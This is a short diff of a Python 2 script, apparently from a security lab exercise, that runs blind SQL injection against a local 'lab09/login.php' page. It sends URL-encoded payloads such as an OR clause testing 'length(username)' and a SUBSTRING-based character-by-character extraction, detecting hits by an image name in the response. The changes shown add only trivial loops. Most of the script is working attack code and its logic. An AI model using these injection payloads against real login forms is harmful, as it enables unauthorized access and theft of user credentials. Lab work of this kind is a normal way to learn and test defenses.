@@ -15,7 +15,10 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 
 
 
-################################# Loop to get field's size
+
+for x in xrange(1,10):
+	pass
+
 size = 0;
 for s in xrange(0,40):
 	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(username)%20=%20" + str(s) + "--%20"
@@ -35,6 +38,10 @@ for pos in xrange(1,size+1):
 		if (response.find('cat.JPG')!=-1): 
 			print "found letter %s at position %d" %(chr(c),pos)
 			break
+
+
+for p in xrange(0,128):
+	print chr(p)			
 
 
 
